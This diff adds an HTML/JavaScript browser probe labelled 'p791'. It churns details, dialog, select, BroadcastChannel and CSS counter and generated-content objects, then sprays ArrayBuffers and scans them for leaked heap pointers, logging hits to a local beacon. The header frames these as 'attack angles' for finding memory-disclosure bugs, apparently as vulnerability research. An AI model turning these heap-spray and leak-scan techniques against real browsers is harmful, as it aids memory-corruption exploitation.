@@ -1,0 +1,510 @@
+<!--
+  p791: HTMLDetailsElement / HTMLDialogElement / HTMLSelectElement /
+        BroadcastChannel / CSS counter-reset/increment / CSS content generation
+
+  HTMLDetailsElement: toggling open/closed exercises C++ ShadowRoot
+  construction, slot assignment, and the internal <summary> element
+  binding. Each toggle creates/destroys the content subtree's layout
+  objects. Rapid toggle churn exercises the shadow DOM allocator.
+
+  HTMLDialogElement: showModal()/close() exercises the C++ top layer
+  stack, backdrop pseudo-element creation, focus trap setup, and
+  return value storage. Each modal cycle allocates C++ PendingDialog
+  entries and inert-subtree records.
+
+  HTMLSelectElement: the option collection (add/remove/selectedIndex)
+  maintains a C++ HTMLOptionsCollection with indexed access. Popup
+  menu state, optgroup management, and multiple selection tracking
+  exercise allocators distinct from the normal DOM child list.
+
+  BroadcastChannel: creates C++ BroadcastChannel objects with
+  message port backing. postMessage serializes via structured clone
+  into C++ SerializedScriptValue. close() tears down the channel.
+  Multiple channels on the same name share a C++ backing group.
+
+  CSS counters: counter-reset/counter-increment on elements exercise
+  the C++ CounterNode tree that the style system maintains parallel
+  to the DOM. content: counter(name) forces counter evaluation during
+  layout. Creating/destroying elements with counters exercises the
+  counter tree allocator.
+
+  CSS content generation: content: attr(x) / content: "string" on
+  ::before/::after pseudo-elements creates C++ RenderQuote and
+  PseudoElement objects. Rapid style changes that add/remove
+  generated content exercise the pseudo-element allocator.
+
+  Attack angles:
+  A) HTMLDetailsElement rapid open/close toggle churn.
+  B) HTMLDialogElement showModal/close cycle churn.
+  C) HTMLSelectElement option add/remove/reorder churn.
+  D) BroadcastChannel create/postMessage/close churn.
+  E) CSS counter-reset/increment tree create/destroy.
+  F) CSS ::before/::after content generation churn.
+
+  CRASH_CLASS: LOW (DOM/CSS/messaging APIs, no side effects)
+  prior art: p785 (Shadow DOM), p784 (CSSStyleSheet), p790 (CSS vars)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p791</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p791-START');
+
+// === Section A: HTMLDetailsElement rapid open/close toggle ===
+try{
+  b('A-details');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var details=[];
+
+      for(var i=0;i<40;i++){
+        var det=document.createElement('details');
+        var sum=document.createElement('summary');
+        sum.textContent='Summary '+round+'_'+i;
+        det.appendChild(sum);
+
+        // Add varied content inside
+        for(var j=0;j<5;j++){
+          var p=document.createElement('p');
+          p.textContent='Detail content '+round+'_'+i+'_'+j+' '+'d'.repeat(20+j);
+          det.appendChild(p);
+        }
+        var ul=document.createElement('ul');
+        for(var j=0;j<3;j++){
+          var li=document.createElement('li');
+          li.textContent='Item '+j;
+          ul.appendChild(li);
+        }
+        det.appendChild(ul);
+
+        document.body.appendChild(det);
+
+        // Rapid toggle to exercise shadow DOM construction/destruction
+        for(var t=0;t<10;t++){
+          det.open=true;
+          det.open=false;
+        }
+        det.open=(i%2===0);
+
+        details.push(det);
+      }
+
+      if(round===0)b('A created '+details.length+' details elements, toggled 10x each');
+
+      for(var i=0;i<details.length;i++){
+        document.body.removeChild(details[i]);
+      }
+      details=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[32,48,64,96,128]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: HTMLDialogElement showModal/close cycle ===
+try{
+  b('B-dialog');
+  var bHits=0;
+
+  var dialogSupported=typeof HTMLDialogElement!=='undefined';
+  if(!dialogSupported){
+    try{
+      var test=document.createElement('dialog');
+      dialogSupported=typeof test.showModal==='function';
+    }catch(e){}
+  }
+
+  if(!dialogSupported){
+    b('B-SKIP no HTMLDialogElement');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var dialogs=[];
+
+        for(var i=0;i<30;i++){
+          var dlg=document.createElement('dialog');
+          dlg.style.cssText='width:200px;height:100px;';
+
+          var content=document.createElement('div');
+          content.innerHTML='<h3>Dialog '+round+'_'+i+'</h3><p>Content '+'c'.repeat(30)+'</p>';
+          dlg.appendChild(content);
+
+          var closeBtn=document.createElement('button');
+          closeBtn.textContent='Close';
+          dlg.appendChild(closeBtn);
+
+          var form=document.createElement('form');
+          form.method='dialog';
+          var submitBtn=document.createElement('button');
+          submitBtn.type='submit';
+          submitBtn.value='result_'+round+'_'+i;
+          submitBtn.textContent='Submit';
+          form.appendChild(submitBtn);
+          dlg.appendChild(form);
+
+          document.body.appendChild(dlg);
+
+          // showModal/close cycles
+          for(var c=0;c<5;c++){
+            try{
+              dlg.showModal();
+              dlg.close('return_'+round+'_'+i+'_'+c);
+            }catch(e){}
+          }
+
+          // show (non-modal) / close cycles
+          for(var c=0;c<5;c++){
+            try{
+              dlg.show();
+              dlg.close();
+            }catch(e){}
+          }
+
+          if(round===0&&i===0){
+            b('B returnValue='+dlg.returnValue);
+            b('B open='+dlg.open);
+          }
+
+          dialogs.push(dlg);
+        }
+
+        if(round===0)b('B created '+dialogs.length+' dialogs, 10 show/close cycles each');
+
+        for(var i=0;i<dialogs.length;i++){
+          document.body.removeChild(dialogs[i]);
+        }
+        dialogs=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      bHits+=sprayAndScan('B',round,[48,64,96,128]);
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: HTMLSelectElement option add/remove/reorder ===
+try{
+  b('C-select');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var selects=[];
+
+      for(var i=0;i<30;i++){
+        var sel=document.createElement('select');
+        sel.multiple=(i%3===0);
+        sel.size=(i%3===0)?5:1;
+        document.body.appendChild(sel);
+
+        // Add options
+        for(var j=0;j<20;j++){
+          var opt=document.createElement('option');
+          opt.value='val_'+round+'_'+i+'_'+j;
+          opt.text='Option '+j+' '+'o'.repeat(10+j%10);
+          sel.add(opt);
+        }
+
+        // Add optgroups
+        for(var g=0;g<3;g++){
+          var grp=document.createElement('optgroup');
+          grp.label='Group '+g;
+          for(var j=0;j<5;j++){
+            var opt=document.createElement('option');
+            opt.value='grp_'+g+'_'+j;
+            opt.text='Grouped '+g+'-'+j;
+            grp.appendChild(opt);
+          }
+          sel.appendChild(grp);
+        }
+
+        if(round===0&&i===0){
+          b('C options.length='+sel.options.length+' selectedIndex='+sel.selectedIndex);
+        }
+
+        // Manipulate: remove from middle, add at start, change selection
+        for(var j=0;j<10;j++){
+          if(sel.options.length>5){
+            sel.remove(Math.floor(sel.options.length/2));
+          }
+          var newOpt=new Option('New_'+round+'_'+j,'new_'+j);
+          sel.add(newOpt,0);
+          sel.selectedIndex=j%sel.options.length;
+        }
+
+        // Access items to exercise collection cache
+        for(var j=0;j<sel.options.length;j++){
+          var o=sel.options[j];
+          var v=o.value;
+          var t=o.text;
+          var s=o.selected;
+        }
+
+        selects.push(sel);
+      }
+
+      if(round===0)b('C churned '+selects.length+' select elements with options/optgroups');
+
+      for(var i=0;i<selects.length;i++){
+        document.body.removeChild(selects[i]);
+      }
+      selects=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    cHits+=sprayAndScan('C',round,[32,48,64,96]);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: BroadcastChannel create/postMessage/close ===
+try{
+  b('D-broadcast');
+  var dHits=0;
+
+  var bcSupported=typeof BroadcastChannel!=='undefined';
+  if(!bcSupported){
+    b('D-SKIP no BroadcastChannel');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var channels=[];
+
+        for(var i=0;i<40;i++){
+          var name='chan_'+round+'_'+i;
+          var ch1=new BroadcastChannel(name);
+          var ch2=new BroadcastChannel(name);
+          var received=0;
+
+          ch2.onmessage=function(e){received++;};
+
+          // Post messages (exercises structured clone serialization)
+          for(var j=0;j<10;j++){
+            try{
+              ch1.postMessage({
+                type:'test',
+                round:round,
+                idx:i,
+                seq:j,
+                data:'payload_'+'p'.repeat(20+j%15),
+                arr:[1,2,3,j],
+                nested:{a:j,b:'val_'+round}
+              });
+            }catch(e){}
+          }
+
+          // Post typed array data
+          try{
+            var ta=new Float64Array([1.1,2.2,3.3,i*0.1]);
+            ch1.postMessage(ta);
+          }catch(e){}
+
+          channels.push(ch1);
+          channels.push(ch2);
+        }
+
+        if(round===0)b('D created '+channels.length+' BroadcastChannels (40 pairs), posted 11 msgs each');
+
+        // Close all
+        for(var i=0;i<channels.length;i++){
+          try{channels[i].close();}catch(e){}
+        }
+        channels=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      dHits+=sprayAndScan('D',round,[32,48,64,96,128]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: CSS counter-reset/increment tree ===
+try{
+  b('E-counters');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var container=document.createElement('div');
+      document.body.appendChild(container);
+
+      // Create a style element with counter rules
+      var style=document.createElement('style');
+      style.textContent=
+        '.ctr-root { counter-reset: sec'+round+' 0 sub'+round+' 0; }\n'+
+        '.ctr-sec { counter-increment: sec'+round+'; counter-reset: sub'+round+' 0; }\n'+
+        '.ctr-sec::before { content: "Section " counter(sec'+round+') ": "; font-weight: bold; }\n'+
+        '.ctr-sub { counter-increment: sub'+round+'; }\n'+
+        '.ctr-sub::before { content: counter(sec'+round+') "." counter(sub'+round+') " "; }\n'+
+        '.ctr-nested { counter-reset: nest'+round+' 0; }\n'+
+        '.ctr-nested-item { counter-increment: nest'+round+'; }\n'+
+        '.ctr-nested-item::before { content: counter(sec'+round+') "." counter(sub'+round+') "." counter(nest'+round+') " "; }';
+      document.head.appendChild(style);
+
+      container.className='ctr-root';
+
+      // Build counter tree
+      for(var s=0;s<10;s++){
+        var sec=document.createElement('div');
+        sec.className='ctr-sec';
+        sec.textContent='Heading '+round+'_'+s;
+        container.appendChild(sec);
+
+        for(var p=0;p<5;p++){
+          var sub=document.createElement('div');
+          sub.className='ctr-sub';
+          sub.textContent='Para '+round+'_'+s+'_'+p+' '+'x'.repeat(15);
+          container.appendChild(sub);
+
+          if(p%2===0){
+            var nest=document.createElement('div');
+            nest.className='ctr-nested';
+            for(var n=0;n<3;n++){
+              var item=document.createElement('div');
+              item.className='ctr-nested-item';
+              item.textContent='Nested item '+n;
+              nest.appendChild(item);
+            }
+            container.appendChild(nest);
+          }
+        }
+      }
+
+      if(round===0)b('E built counter tree: '+container.childNodes.length+' direct children');
+
+      // Force layout to evaluate counters
+      var h=container.offsetHeight;
+
+      // Remove elements from middle to exercise counter tree updates
+      var children=container.childNodes;
+      for(var i=children.length-1;i>=0;i-=3){
+        if(i<children.length)container.removeChild(children[i]);
+      }
+
+      // Force re-layout
+      h=container.offsetHeight;
+
+      document.head.removeChild(style);
+      document.body.removeChild(container);
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96,128]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: CSS ::before/::after content generation churn ===
+try{
+  b('F-generated-content');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var container=document.createElement('div');
+      document.body.appendChild(container);
+
+      // Dynamic style rules for generated content
+      var styles=[];
+      for(var i=0;i<20;i++){
+        var style=document.createElement('style');
+        style.textContent=
+          '.gen'+round+'_'+i+'::before { content: "B'+round+'_'+i+': " attr(data-label); color: red; }\n'+
+          '.gen'+round+'_'+i+'::after { content: " [" attr(data-count) "]"; color: blue; }\n'+
+          '.quote'+round+'_'+i+'::before { content: open-quote; }\n'+
+          '.quote'+round+'_'+i+'::after { content: close-quote; }';
+        document.head.appendChild(style);
+        styles.push(style);
+      }
+
+      // Create elements that trigger generated content
+      for(var i=0;i<40;i++){
+        var el=document.createElement('div');
+        el.className='gen'+round+'_'+(i%20);
+        el.setAttribute('data-label','Label_'+round+'_'+i);
+        el.setAttribute('data-count',String(i));
+        el.textContent='Main content for element '+i;
+        container.appendChild(el);
+
+        // Quote elements
+        var q=document.createElement('span');
+        q.className='quote'+round+'_'+(i%20);
+        q.style.quotes='"\\201C" "\\201D" "\\2018" "\\2019"';
+        q.textContent='Quoted text '+round+'_'+i;
+        container.appendChild(q);
+      }
+
+      // Force layout
+      var h=container.offsetHeight;
+
+      if(round===0)b('F created '+container.childNodes.length+' elements with ::before/::after');
+
+      // Toggle classes to add/remove generated content
+      var children=container.childNodes;
+      for(var i=0;i<children.length;i++){
+        children[i].className='';
+      }
+      h=container.offsetHeight;
+
+      // Re-add classes
+      for(var i=0;i<children.length;i++){
+        if(i%2===0){
+          children[i].className='gen'+round+'_'+(i%20);
+        }else{
+          children[i].className='quote'+round+'_'+(i%20);
+        }
+      }
+      h=container.offsetHeight;
+
+      // Cleanup
+      for(var i=0;i<styles.length;i++){
+        document.head.removeChild(styles[i]);
+      }
+      document.body.removeChild(container);
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[32,48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p791-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
